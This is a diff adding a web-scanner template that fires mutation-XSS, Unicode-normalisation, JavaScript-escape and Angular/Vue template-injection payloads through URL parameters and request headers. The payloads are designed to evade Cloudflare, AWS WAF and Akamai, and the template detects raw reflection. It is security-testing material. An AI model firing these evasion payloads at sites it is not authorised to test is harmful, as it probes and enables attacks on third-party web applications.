@@ -1,0 +1,80 @@
+id: custom-advanced-mxss-waf-bypass
+
+info:
+  name: "Advanced Mutation XSS & WAF Evasion"
+  author: Umut Ozen
+  severity: high
+  description: |
+    Contains special Mutation XSS (mXSS) and Parser Differential payloads designed to bypass 
+    modern WAFs (Cloudflare, AWS WAF, Akamai) that classic XSS scanners (Acunetix, Netsparker, etc.) 
+    rarely use. Targets browser DOM rendering flaws (DOM Clobbering, Unicode Normalization).
+  tags: xss,mxss,waf-bypass,advanced,custom,blind
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?q={{payload}}"
+      - "{{BaseURL}}/?search={{payload}}"
+      - "{{BaseURL}}/?id={{payload}}"
+      - "{{BaseURL}}/?keyword={{payload}}"
+      - "{{BaseURL}}/search?q={{payload}}"
+
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) / {{payload}}"
+      Referer: "{{BaseURL}}/{{payload}}"
+      X-Forwarded-For: "{{payload}}"
+
+    payloads:
+      payload:
+        # 1. mXSS: WAF bypass via isolated tags (Math & style DOM mutation)
+        - '<form><math><mtext></form><form><mglyph><style></math><img src onerror=prompt(1)>'
+        
+        # 2. Unicode Normalization & Space Bypass (Fullwidth chars and form-feed characters)
+        - '%EF%BC%9Cscript%EF%BC%9Ealert(1)%EF%BC%9C/script%EF%BC%9E' # ＜script＞ alert(1) ＜/script＞
+        - '<svg%0Conload=alert(netsparker)>'
+        - '<details%0Aopen%0Aontoggle=prompt(1)>'
+        
+        # 3. JS Context Escape (Escaping quotes and commenting out the rest)
+        - '\x22-prompt(1)-\x22'
+        - '\\"-alert(1)//'
+        - '`+-prompt(1)-+`'
+        
+        # 4. Angular/Vue CSR Bypass
+        - '{{constructor.constructor("alert(1)")()}}'
+        - '<div ng-app ng-csp><textarea autofocus ng-focus="str=$event.view.alert(1)"></textarea></div>'
+
+    attack: clusterbomb
+    threads: 10
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      # Valid only if 200/404 is returned; 403 (WAF block) will not be counted as a match
+      - type: status
+        status:
+          - 200
+          - 404
+          - 500
+
+      # Verifies that payloads are reflected raw on the page without being stripped/html-encoded by WAF
+      - type: regex
+        part: body
+        regex:
+          - "(?i)<img src onerror=prompt\\(1\\)>"
+          - "(?i)<script>alert\\(1\\)</script>"
+          - "(?i)<svg\\s+onload=alert\\(netsparker\\)>"
+          - "(?i)<details\\s+open\\s+ontoggle=prompt\\(1\\)>"
+          - '(?:\\"-alert\\(1\\)//)'
+          - "\\{\\{constructor\\.constructor"
+        condition: or
+
+      # Prevents false positive if WAF leaves known block page strings in the response
+      - type: word
+        part: body
+        words:
+          - "Attention Required! | Cloudflare"
+          - "403 Forbidden"
+          - "Access Denied"
+          - "AkamaiGHost"
+          - "Request blocked"
+        negative: true
